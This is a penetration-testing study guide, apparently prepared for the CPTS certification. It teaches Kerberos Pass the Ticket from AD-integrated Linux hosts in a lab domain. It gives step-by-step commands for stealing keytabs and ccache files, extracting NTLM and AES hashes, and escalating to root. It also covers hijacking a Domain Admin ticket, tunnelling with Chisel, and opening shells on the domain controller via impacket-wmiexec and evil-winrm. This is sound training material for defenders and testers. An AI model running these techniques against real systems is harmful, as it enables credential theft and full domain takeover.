#  🎫1. Pass the Ticket (PtT) from Linux

> [!info]  
> **Pass the Ticket (PtT)** from Linux is a Kerberos-based lateral movement technique where an attacker discovers and reuses valid **Kerberos tickets** or **Kerberos credentials** found on a Linux system.
> 
> Linux systems can integrate with **Active Directory (AD)** and use Kerberos for authentication just like Windows. Therefore, compromising a Linux machine can provide access to Kerberos tickets belonging to other users or machine accounts.

---

# 🧠 2. Big Picture — Kerberos on Linux

Windows and Linux use the same basic Kerberos authentication process:

```text
                 Kerberos
                    │
          ┌─────────┴─────────┐
          ↓                   ↓
        TGT                  TGS
   Ticket Granting       Service Ticket
      Ticket
          │                   │
          └─────────┬─────────┘
                    ↓
              Access Services
```

The **difference is mainly how the tickets are stored**.

On Linux, Kerberos credentials are commonly found as:

- 🗃️ **ccache files**
    
- 🔑 **keytab files**
    

Linux can use Kerberos even if it is **not directly joined to the AD domain**. A Linux machine simply needs a Kerberos client/configuration and access to the appropriate Kerberos infrastructure.

> [!important]  
> **CPTS mental model:**
> 
> `Linux compromise → Find Kerberos material → Identify owner → Reuse/abuse ticket → Authenticate as that identity`

---

# 🗃️ 3. Kerberos ccache Files

A **credential cache (`ccache`)** stores Kerberos credentials/tickets while they remain valid, commonly during a user's session.

The default location is generally:

```text
/tmp/
```

The environment variable:

```bash
KRB5CCNAME
```

tells Kerberos-aware applications where the current credential cache is located.

Example:

```bash
env | grep -i krb5
```

Output:

```text
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

> [!important]  
> If you obtain access to another user's valid ccache file, you may be able to authenticate as that user **without knowing their plaintext password**.

Linux normally protects these files with filesystem permissions, but **root or another sufficiently privileged account** may be able to access them.

---

# 🔑 4. Kerberos Keytab Files

A **keytab** is a file containing:

- Kerberos principals
    
- Encrypted Kerberos keys derived from the associated password
    

The important idea is:

```text
Password
   ↓
Kerberos key
   ↓
Stored in keytab
   ↓
Used by applications/scripts
   ↓
Authenticate without typing password
```

Keytabs are particularly useful for **automated authentication**.

For example, a script can use a keytab to authenticate to a Windows SMB share without storing a plaintext password in the script.

### ⚠️ Keytab security implication

Keytabs are not necessarily tied to the machine where they were created.

A keytab can be created on one computer and copied to another system and used there.

> [!warning]  
> Treat a readable keytab as **credential material**, not merely as a configuration file.

---

# 🎯 5. Assessment Scenario

Example environment:

```text
                    ┌──────────────────┐
                    │      DC01        │
                    │ Domain Controller│
                    └────────┬─────────┘
                             │
                             │ Kerberos / AD
                             │
                    ┌────────▼─────────┐
                    │     LINUX01      │
                    │ AD-integrated    │
                    └────────┬─────────┘
                             │
                       compromised
                             │
                             ↓
                  Search Kerberos material
                             │
                ┌────────────┴────────────┐
                ↓                         ↓
             keytab                    ccache
                │                         │
                ↓                         ↓
          Impersonate user          Reuse ticket
                │                         │
                └────────────┬────────────┘
                             ↓
                     Lateral Movement
```

The example environment contains:

```text
LINUX01
    ↓
MS01
    ↓
DC01
```

The Linux host can be reached through `MS01`, either by SSH through a port forward or by forwarding traffic. The example credentials are:

```text
User: david@inlanefreight.htb
Password: Password2
```

Example SSH connection through the forwarded port:

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

The resulting system is:

```text
Ubuntu 20.04.5 LTS
Hostname: linux01
IP: 172.16.1.15
```

---

# 🔎 6. Determine Whether Linux Is AD-Integrated

## 6.1 `realm`

The easiest check is:

```bash
realm list
```

Example:

```text
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

### What this tells us

```text
configured: kerberos-member
        ↓
Linux participates in Kerberos

server-software: active-directory
        ↓
AD is the backend

client-software: sssd
        ↓
SSSD handles the integration

permitted-logins / groups
        ↓
Shows which AD identities can access Linux
```

In this example, **David**, **Julio**, and members of **Linux Admins** are permitted to log in.

---

## 6.2 Check `sssd` / `winbind`

If `realm` is unavailable, look for common AD integration services:

```bash
ps -ef | grep -i "winbind\|sssd"
```

Example:

```text
root  2140  1  0 /usr/sbin/sssd -i --logger=files
root  2141 2140 0 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb
root  2142 2140 0 /usr/libexec/sssd/sssd_nss
root  2143 2140 0 /usr/libexec/sssd/sssd_pam
```

The presence of **SSSD** or **winbind** can indicate integration with Active Directory.

---

# 🔍 7. Finding Kerberos Material

Once we establish that Linux is AD-integrated, start looking for:

```text
🔎 Kerberos Hunting
       │
       ├── 🔑 Keytabs
       │      └── *.keytab
       │
       ├── 🗃️ Ccache
       │      └── /tmp/krb5cc_*
       │
       ├── ⚙️ Scripts
       │      └── kinit / keytab references
       │
       └── 🤖 Automated services
              └── cron / SSSD / Samba
```

---

# 🔑 8. Finding Keytab Files

A simple search:

```bash
find / -name *keytab* -ls 2>/dev/null
```

Example:

```text
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw-rw-rw- 1 root root  216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

The important discovery here is:

```text
/etc/krb5.keytab
/opt/specialfiles/carlos.keytab
```

> [!warning]  
> The source specifically notes that using a keytab requires **read and write (`rw`) privileges** on the file.

---

# 🕵️ 9. Find Keytabs Through Scripts and Cronjobs

Do **not** only search for filenames ending in `.keytab`.

Administrators may reference a keytab from:

- Cronjobs
    
- Shell scripts
    
- Services
    
- Automated tasks
    

The filename itself may not contain `keytab`.

Check the current user's cronjobs:

```bash
crontab -l
```

Example:

```text
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

Inspect the script:

```bash
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

Example:

```bash
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

### 🔎 What should immediately stand out?

```text
kinit
 │
 ├── -k  → use a keytab
 │
 └── -t  → specify keytab
```

Here:

```text
Principal:
svc_workstations@INLANEFREIGHT.HTB

Keytab:
svc_workstations.kt
```

The script uses that keytab to obtain Kerberos credentials and then accesses an SMB share using Kerberos.

---

# 🧠 10. `kinit` — Important Concept

`kinit` interacts with Kerberos and obtains a **TGT**, placing the resulting credentials into the credential cache.

Conceptually:

```text
Keytab
   │
   │ kinit
   ↓
Kerberos Authentication
   │
   ↓
TGT
   │
   ↓
ccache
   │
   ↓
Use Kerberos-enabled tools
```

Example:

```bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /path/to/keytab
```

> [!tip]  
> When you see **`kinit` + `-k` + `-t`** during Linux enumeration, immediately investigate the referenced keytab.

---

# 🖥️ 11. `/etc/krb5.keytab` — Machine Account

An AD-integrated Linux machine itself needs Kerberos credentials.

The default machine keytab is commonly:

```text
/etc/krb5.keytab
```

It is normally readable only by root.

If compromised with sufficient privileges, obtaining this keytab may allow impersonation of the Linux computer account.

Example:

```text
LINUX01$
   ↓
LINUX01$.INLANEFREIGHT.HTB
```

> [!important]  
> Remember the distinction:
> 
> **User keytab** → potentially impersonate a user/service account  
> **Machine keytab** → potentially impersonate the Linux computer account

---

# 🗃️ 12. Finding ccache Files

Check the current Kerberos environment:

```bash
env | grep -i krb5
```

Example:

```text
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Search `/tmp`:

```bash
ls -la /tmp
```

Example:

```text
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 ... krb5cc_647401106_tBswau
-rw------- 1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 ... krb5cc_647401107_Gf415d
-rw------- 1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 ... krb5cc_647402606_qd2Pfh
```

This is extremely useful because the filename itself may reveal the relationship between:

```text
ccache → user → Kerberos identity
```

---

# 🔑 13. Abusing a Keytab

Once you discover a keytab, first determine **which principal it belongs to**.

Use:

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

Example:

```text
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
1    10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

This tells us:

```text
Keytab
   ↓
Principal = carlos@INLANEFREIGHT.HTB
```

`klist -k -t` is therefore an important **keytab identification command**.

---

# ⚠️ 14. Case Sensitivity Matters

`kinit` is **case-sensitive**.

If `klist` reports:

```text
carlos@INLANEFREIGHT.HTB
```

use that exact principal.

Do not arbitrarily change:

```text
carlos
```

to:

```text
CARLOS
```

or:

```text
inlanefreight.htb
```

to:

```text
INLANEFREIGHT.HTB
```

---

# 🎭 15. Impersonating a User with a Keytab

First inspect the current ticket:

```bash
klist
```

Example:

```text
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

Then use Carlos's keytab:

```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

Verify:

```bash
klist
```

Now:

```text
Default principal: carlos@INLANEFREIGHT.HTB
```

The current Kerberos identity has changed from:

```text
david
```

to:

```text
carlos
```

---

# 📂 16. Verify Access Using Kerberos

Now use a Kerberos-aware tool.

Example:

```bash
smbclient //dc01/carlos -k -c ls
```

Output:

```text
.                  D        0
..                 D        0
carlos.txt         A       15
```

Important flag:

```text
-k
```

means use **Kerberos authentication**.

So the workflow is:

```text
Carlos keytab
     ↓
kinit
     ↓
Carlos TGT
     ↓
ccache
     ↓
smbclient -k
     ↓
Access SMB as Carlos
```

> [!tip]  
> If you want to preserve your original Kerberos session, save/copy the existing ccache before importing another identity with `kinit`.

---

# 🧬 17. KeyTabExtract — Extracting Secrets

A keytab can contain more than something directly usable by `kinit`.

**KeyTabExtract** can extract information such as:

- Realm
    
- Service Principal
    
- Encryption types
    
- NTLM hash
    
- AES-256 key/hash
    
- AES-128 key/hash
    

Example:

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

Example output:

```text
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

---

# 🔓 18. What Can We Do With Extracted Keytab Material?

```text
                 Keytab
                    │
             KeyTabExtract
                    │
       ┌────────────┼────────────┐
       ↓            ↓            ↓
     NTLM         AES-128       AES-256
       │            │            │
       ↓            └──────┬─────┘
   Pass the Hash           ↓
                    Kerberos attacks
                    / ticket creation
                    / password cracking
```

### NTLM hash

Can potentially be used for:

```text
Pass the Hash
```

### AES keys

Can be used for Kerberos-related attacks, including obtaining/forging appropriate tickets with tools such as Rubeus, depending on the environment.

They can also potentially be attacked to recover the underlying password.

> [!important]  
> A single keytab can contain **multiple credential types** and may even contain credentials for multiple users.

---

# 🔨 19. Cracking an Extracted NTLM Hash

The source demonstrates cracking the extracted NTLM hash using password-cracking tools such as **Hashcat** or **John the Ripper**.

The example password recovered for Carlos was:

```text
Password5
```

After recovering the password, the attacker can authenticate directly as Carlos.

Example:

```bash
su - carlos@inlanefreight.htb
```

Then:

```bash
klist
```

shows:

```text
Default principal: carlos@INLANEFREIGHT.HTB
```

---

# 🔁 20. Follow the Credential Chain

The assessment demonstrates an important CPTS concept: **one compromised credential can lead to another**.

```text
Initial user
    ↓
Find keytab
    ↓
Identify principal
    ↓
kinit
    ↓
Impersonate service/user
    ↓
Find another keytab
    ↓
Extract credentials
    ↓
Crack / reuse credentials
    ↓
Gain another account
    ↓
Enumerate privileges
    ↓
Privilege escalation / lateral movement
```

In the scenario:

```text
David
 ↓
Carlos keytab
 ↓
Carlos
 ↓
svc_workstations keytab
 ↓
svc_workstations
 ↓
sudo privileges
 ↓
root
```

---

# 🗃️ 21. Abusing ccache Files

A ccache file requires **read access** to use.

They are commonly located under:

```text
/tmp/
```

and are normally protected so that only the creating user can read them.

However:

```text
root
  ↓
can read other users' ccache files
```

---

# 👑 22. Privilege Escalation Through `sudo`

After obtaining the `svc_workstations` account:

```bash
sudo -l
```

Example:

```text
User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
```

This means the account can execute commands as root.

Then:

```bash
sudo su
```

Verify:

```bash
whoami
```

Output:

```text
root
```

> [!success]  
> **CPTS lesson:** Kerberos abuse doesn't necessarily end with lateral movement. The newly obtained identity should always be checked for:
> 
> - `sudo -l`
>     
> - Group membership
>     
> - File permissions
>     
> - Additional credentials
>     
> - Additional Kerberos tickets
>     

---

# 🔎 23. Enumerate All ccache Files as Root

Once root:

```bash
ls -la /tmp
```

Example:

```text
krb5cc_647401106_HRJDux   → julio
krb5cc_647401106_qMKxc6   → julio
krb5cc_647401107_O0oUWh   → david
krb5cc_647401109_D7gVZF   → svc_workstations
krb5cc_647402606           → carlos
krb5cc_647402606_ZX6KFA   → carlos
```

The key observation:

```text
/tmp
 │
 ├── david ccache
 ├── carlos ccache
 ├── svc_workstations ccache
 └── julio ccache  ← not yet compromised
```

---

# 👀 24. Identify High-Value Accounts

Use:

```bash
id julio@inlanefreight.htb
```

Example:

```text
uid=647401106(julio@inlanefreight.htb)
gid=647400513(domain users@inlanefreight.htb)
groups=647400513(domain users@inlanefreight.htb),
       647400512(domain admins@inlanefreight.htb),
       647400572(denied rodc password replication group@inlanefreight.htb)
```

The critical discovery is:

```text
domain admins@inlanefreight.htb
```

Therefore:

```text
Julio
  ↓
Domain Admins
  ↓
HIGH-VALUE Kerberos identity
```

This is much more valuable than blindly using every discovered ticket.

---

# 🎫 25. Importing a ccache Into the Current Session

First copy the desired ccache:

```bash
cp /tmp/krb5cc_647401106_I8I133 .
```

Set:

```bash
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

Verify:

```bash
klist
```

Example:

```text
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires
10/07/2022 13:25:01  10/07/2022 23:25:01

Service principal:
krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

The important operation is:

```bash
export KRB5CCNAME=/path/to/ccache
```

This tells Kerberos-aware applications:

> **"Use this credential cache."**

---

# 💻 26. Use the Imported Ticket

With Julio's TGT loaded:

```bash
smbclient //dc01/C$ -k -c ls -no-pass
```

The command successfully accesses the domain controller's administrative share.

The key options are:

```text
-k
   Use Kerberos

-no-pass
   Do not request a password
```

Because authentication comes from the ccache:

```text
ccache
  ↓
KRB5CCNAME
  ↓
Kerberos-aware application
  ↓
Kerberos authentication
  ↓
DC01
```

---

# ⏳ 27. Ticket Lifetime Matters

`klist` shows:

```text
Valid starting
Expires
renew until
```

Example:

```text
Valid starting: 10/07/2022 13:25:01
Expires:        10/07/2022 23:25:01
Renew until:    10/08/2022 13:25:01
```

> [!warning]  
> A Kerberos ticket is **not permanent**.
> 
> If its expiration time has passed, the ticket cannot be used for authentication.

ccache files are also temporary and can change during login/logout or normal session activity.

---

# 🌐 28. Using Linux Attack Tools With Kerberos

Many Linux tools that interact with Windows/AD support Kerberos.

The basic requirements are:

### From an AD-integrated Linux machine

```text
Valid ccache
      ↓
KRB5CCNAME points to it
      ↓
Kerberos-aware tool
      ↓
Target
```

### From an external attack machine

You additionally need:

```text
Attack Host
    │
    ├── Network path to KDC/DC
    ├── Correct DNS/name resolution
    ├── Kerberos configuration
    └── Valid ccache
```

If the attack host cannot directly reach the DC/KDC, proxy the traffic through an accessible machine.

---

# 🚇 29. Kerberos Through Chisel + Proxychains

Scenario:

```text
Attack Host
     │
     │ SOCKS
     ↓
   MS01
     │
     ↓
   DC01 / KDC
```

The source uses:

- **Chisel** → create the tunnel
    
- **Proxychains** → send applications through the SOCKS proxy
    
- `/etc/hosts` → resolve internal domain names locally
    

---

# 📝 30. Configure `/etc/hosts`

Example:

```bash
cat /etc/hosts
```

```text
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

> [!important]  
> Kerberos relies heavily on **correct hostnames and DNS resolution**. When operating through a tunnel, internal names may not resolve from the attack machine, so `/etc/hosts` can be used to map the required names to their internal IP addresses.

---

# 🔌 31. Configure Proxychains

Edit:

```text
/etc/proxychains.conf
```

Proxy:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

The resulting flow:

```text
Application
    ↓
Proxychains
    ↓
127.0.0.1:1080
    ↓
Chisel SOCKS tunnel
    ↓
MS01
    ↓
Internal network
```

---

# 🕳️ 32. Chisel Reverse SOCKS Tunnel

On the attack host:

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

Example:

```text
Reverse tunneling enabled
Listening on http://0.0.0.0:8080
```

Then, from `MS01`:

```cmd
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

Output:

```text
client: Connecting to ws://10.10.14.33:8080
client: Connected
```

> [!tip]  
> The `10.10.14.33` value represents the **attack host IP** in this example.

---

# 🎟️ 33. Transfer the ccache to the Attack Host

Once the desired ccache has been obtained:

```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

Now Kerberos-aware tools launched from the attack host can use that ticket.

---

# 💥 34. Impacket + Kerberos

When using Impacket with Kerberos:

```text
IMPORTANT:
Use target hostname, NOT IP address
Use -k
Use -no-pass if required
```

Example:

```bash
proxychains impacket-wmiexec dc01 -k
```

Output eventually confirms:

```text
C:\>whoami
inlanefreight\julio
```

The proxy output shows connections to:

```text
dc01:445
INLANEFREIGHT.HTB:88
dc01:135
```

This demonstrates the Kerberos authentication path through the SOCKS proxy.

> [!important]  
> **Do not use the DC's IP when Kerberos expects the hostname.**
> 
> Think:
> 
> ```text
> ❌ 10.129.x.x
> ✅ dc01
> ```

---

# 🧩 35. `KRB5CCNAME` — `FILE:` Prefix

Some Linux AD implementations set:

```text
KRB5CCNAME=FILE:/tmp/krb5cc_...
```

When using certain Impacket tools, the source notes that you may need to set the variable to the **path only**, without the `FILE:` prefix.

---

# 🛠️ 36. Evil-WinRM With Kerberos

To use Kerberos authentication with Evil-WinRM on Debian-based systems such as Kali/Parrot, install:

```bash
sudo apt-get install krb5-user -y
```

During configuration:

```text
Default realm:
INLANEFREIGHT.HTB

KDC:
DC01
```

If already installed, configure:

```text
/etc/krb5.conf
```

Example:

```ini
[libdefaults]
        default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

---

# 🖥️ 37. Evil-WinRM + Kerberos + Proxychains

Example:

```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

After connection:

```powershell
whoami ; hostname
```

Output:

```text
inlanefreight\julio
DC01
```

So:

```text
Julio's ccache
      ↓
KRB5CCNAME
      ↓
Kerberos
      ↓
Proxychains
      ↓
DC01
      ↓
Evil-WinRM
      ↓
Authenticated as julio
```

---

# 🔄 38. Converting Linux ccache ↔ Windows `.kirbi`

Windows and Linux use different common ticket formats:

```text
Linux
  ↓
ccache

Windows
  ↓
.kirbi
```

**Impacket Ticket Converter** can convert between them.

Example:

```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Output:

```text
[*] converting ccache to kirbi...
[+] done
```

---

# 🔁 39. Import Converted `.kirbi` Into Windows

Once the ccache has been converted:

```text
ccache
   ↓
impacket-ticketConverter
   ↓
julio.kirbi
   ↓
Windows
```

Import with Rubeus:

```cmd
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

Success:

```text
[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Verify:

```cmd
klist
```

Example:

```text
Client: julio @ INLANEFREIGHT.HTB
Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
```

Now Windows can use the imported ticket.

Example:

```cmd
dir \\dc01\julio
```

---

# 🔄 40. Cross-Platform Ticket Conversion

This is an important CPTS concept:

```text
             Kerberos Ticket
                   │
          ┌────────┴────────┐
          ↓                 ↓
       Linux              Windows
       ccache              .kirbi
          │                 │
          └──── Converter ──┘
```

Therefore:

```text
Linux ccache → Windows .kirbi
Windows .kirbi → Linux ccache
```

This allows Kerberos credentials discovered on one operating system to potentially be used from another.

---

# 🐧 41. Linikatz

**Linikatz** is a Linux credential-extraction tool designed for systems integrated with Active Directory.

Mental model:

```text
Windows:
Mimikatz
    ↓
Extract credentials / tickets

Linux:
Linikatz
    ↓
Extract credentials / tickets
```

It can extract credentials from different Linux AD/Kerberos implementations, including:

- FreeIPA
    
- SSSD
    
- Samba
    
- Vintella
    
- Other Kerberos-related configurations
    

The tool requires **root** and stores discovered material in a directory beginning with:

```text
linikatz.
```

The resulting data can include formats such as:

```text
ccache
keytabs
```

---

# ⚙️ 42. Linikatz Example

Download:

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

Execute:

```bash
/opt/linikatz.sh
```

The example output discovers:

```text
SSSD configuration
Samba configuration
Kerberos configuration
Machine Kerberos tickets
User Kerberos tickets
```

It also identifies files such as:

```text
/etc/sssd/sssd.conf
/etc/samba/smb.conf
/etc/krb5.conf
/etc/krb5.keytab
/tmp/krb5cc_*
```

and SSSD's Kerberos cache:

```text
/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
```

---

# 🧠 43. Linikatz Output — What to Look For

Example machine ticket:

```text
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB
```

This is a **machine account ticket**.

Example user ticket:

```text
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB
```

Another:

```text
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB
```

So Linikatz can reveal both:

```text
Machine identities
        +
User identities
        +
Kerberos tickets
        +
Keytabs
        +
SSSD/Samba credential material
```

---

# 🧠 44. Complete Linux PtT Methodology

```text
                         🔎 LINUX COMPROMISE
                                │
                                ↓
                    🏢 Is Linux AD-integrated?
                                │
                  ┌─────────────┴─────────────┐
                  ↓                           ↓
             realm list                 ps -ef | grep
                  │                    sssd / winbind
                  └─────────────┬─────────────┘
                                ↓
                     🎫 Hunt Kerberos Material
                                │
                  ┌─────────────┴─────────────┐
                  ↓                           ↓
              🔑 Keytabs                  🗃️ Ccache
                  │                           │
                  ↓                           ↓
          find *keytab*                 /tmp/krb5cc_*
                  │                           │
                  ↓                           ↓
        klist -k -t <keytab>          KRB5CCNAME
                  │                           │
                  ↓                           ↓
              Identify                   Identify
              principal                   owner
                  │                           │
                  ↓                           ↓
               kinit                    export KRB5CCNAME
                  │                           │
                  └─────────────┬─────────────┘
                                ↓
                     🎫 Valid Kerberos Identity
                                │
                                ↓
                    🔎 Enumerate Privileges
                                │
                ┌───────────────┼───────────────┐
                ↓               ↓               ↓
              SMB            WMI/WinRM       Other AD
                │               │             services
                └───────────────┼───────────────┘
                                ↓
                      ↔️ Lateral Movement
                                │
                                ↓
                     👑 Higher Privilege
```

---

# 🧰 45. CPTS Command Cheat Sheet

## 🔎 Identify AD Integration

```bash
realm list
```

```bash
ps -ef | grep -i "winbind\|sssd"
```

---

## 🔑 Find Keytabs

```bash
find / -name *keytab* -ls 2>/dev/null
```

---

## 🔍 Identify Keytab Principal

```bash
klist -k -t /path/to/file.keytab
```

---

## 🎫 Import Keytab / Obtain TGT

```bash
kinit <principal> -k -t /path/to/file.keytab
```

---

## 👀 View Current Kerberos Tickets

```bash
klist
```

---

## 🗃️ Find ccache Location

```bash
env | grep -i krb5
```

---

## 📂 Search ccache Files

```bash
ls -la /tmp
```

---

## 🎯 Use a Specific ccache

```bash
export KRB5CCNAME=/path/to/ccache
```

---

## 📁 SMB With Kerberos

```bash
smbclient //dc01/share -k -c ls
```

---

## 💥 Extract Keytab Secrets

```bash
python3 /opt/keytabextract.py /path/to/file.keytab
```

---

## 👑 Check Linux Privileges

```bash
sudo -l
```

```bash
id <user>
```

---

## 🪟 Impacket + Kerberos

```bash
proxychains impacket-wmiexec dc01 -k
```

---

## 🖥️ Evil-WinRM + Kerberos

```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

---

## 🔄 Convert ccache → kirbi

```bash
impacket-ticketConverter <ccache> <output>.kirbi
```

---

## 🎫 Import `.kirbi` on Windows

```cmd
Rubeus.exe ptt /ticket:<ticket>.kirbi
```

---

## 🐧 Linikatz

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

```bash
/opt/linikatz.sh
```

---

# ⚖️ 46. Keytab vs ccache

|Feature|Keytab|ccache|
|---|---|---|
|Purpose|Stores Kerberos principals and keys|Stores active Kerberos credentials/tickets|
|Common location|`/etc/krb5.keytab`, application/script directories|`/tmp/krb5cc_*`|
|Common use|Automated authentication|Active user/session authentication|
|Useful command|`klist -k -t`|`klist`|
|Main abuse path|`kinit -k -t`|`KRB5CCNAME`|
|Can identify user|Yes|Yes|
|Can provide Kerberos authentication|Yes|Yes|
|Typical privilege concern|File read access|File read access / root access|

---

# 🧠 47. Critical Concepts to Memorize

> [!important]
> 
> ### `KRB5CCNAME`
> 
> Points Kerberos-aware applications to the credential cache they should use.
> 
> ```bash
> export KRB5CCNAME=/path/to/ccache
> ```

> [!important]
> 
> ### `klist`
> 
> Shows currently available Kerberos tickets and their validity.
> 
> ```bash
> klist
> ```

> [!important]
> 
> ### `klist -k -t`
> 
> Examines a **keytab** and shows its principals.
> 
> ```bash
> klist -k -t <keytab>
> ```

> [!important]
> 
> ### `kinit`
> 
> Obtains Kerberos credentials/TGT.
> 
> ```bash
> kinit user@REALM -k -t <keytab>
> ```

> [!important]
> 
> ### `-k`
> 
> Tells Kerberos tools to use a **keytab** rather than interactively requesting a password.

> [!important]
> 
> ### `-t`
> 
> Specifies the keytab file.

> [!important]
> 
> ### `-k` in Kerberos-aware network tools
> 
> Tells tools such as `smbclient` to authenticate using Kerberos.

---

# 🧠 48. The Most Important Mental Model

Think of Linux Kerberos credentials as **two doors into the same authentication system**:

```text
                 🔐 Kerberos
                     │
          ┌──────────┴──────────┐
          ↓                     ↓
       🔑 KEYTAB              🗃️ CCACHE
          │                     │
          │                     │
      Long-term-ish          Active ticket
      key material           cache
          │                     │
          ↓                     ↓
        kinit              KRB5CCNAME
          │                     │
          └──────────┬──────────┘
                     ↓
                 🎫 TGT
                     │
                     ↓
             Kerberos Services
                     │
          ┌──────────┼──────────┐
          ↓          ↓          ↓
         SMB        WMI       WinRM
```

---

# 🎯 49. CPTS Attack-Path Mental Model

```text
1️⃣ GET LINUX ACCESS
        ↓
2️⃣ CHECK AD INTEGRATION
        ↓
3️⃣ FIND KERBEROS MATERIAL
        ↓
4️⃣ IDENTIFY WHO OWNS IT
        ↓
5️⃣ CHECK TICKET VALIDITY
        ↓
6️⃣ ABUSE KEYTAB OR CCACHE
        ↓
7️⃣ BECOME / AUTHENTICATE AS USER
        ↓
8️⃣ ENUMERATE GROUPS + PRIVILEGES
        ↓
9️⃣ ACCESS SMB / WMI / WinRM / AD SERVICES
        ↓
🔟 LOOK FOR MORE CREDENTIALS
        ↓
👑 ESCALATE / LATERALLY MOVE
```

> [!success]  
> **The key CPTS lesson:** Don't think of a Kerberos ticket as "just a file." A valid ticket represents an **authenticated identity**. If you can obtain and correctly present that ticket to a Kerberos-aware service, you may be able to authenticate as the ticket's owner without knowing their password.

---

# 📌 50. Final CPTS Takeaways

- 🐧 Linux can integrate with **Active Directory** and use Kerberos.
    
- 🎫 Linux commonly stores Kerberos credentials in **ccache files**.
    
- 🔑 **Keytabs** contain Kerberos principals and encrypted keys.
    
- 📍 `KRB5CCNAME` identifies the active ccache.
    
- 🔎 `realm list` is a quick way to identify AD integration.
    
- 🔎 `ps -ef | grep -i "winbind\|sssd"` is an alternative check.
    
- 🔑 `find / -name *keytab* -ls 2>/dev/null` searches for keytabs.
    
- 🔍 `klist -k -t` identifies the principal associated with a keytab.
    
- 🎫 `kinit -k -t` can use a keytab to obtain Kerberos credentials.
    
- 🗃️ `/tmp` is an important location to investigate for ccache files.
    
- 👑 Root can potentially access other users' ccache files.
    
- 🧬 KeyTabExtract can expose NTLM, AES-128, and AES-256 credential material.
    
- 🔨 Extracted NTLM material can potentially be used for Pass the Hash or cracked.
    
- 👥 Always check the privileges of discovered identities with `id`.
    
- 🏆 **Domain Admins** membership makes a discovered Kerberos identity particularly valuable.
    
- ⏳ Always check `Valid starting`, `Expires`, and `renew until`.
    
- 🌐 Kerberos authentication depends heavily on correct **hostname/DNS resolution**.
    
- 🚇 Chisel + Proxychains can provide network access to an internal KDC/DC.
    
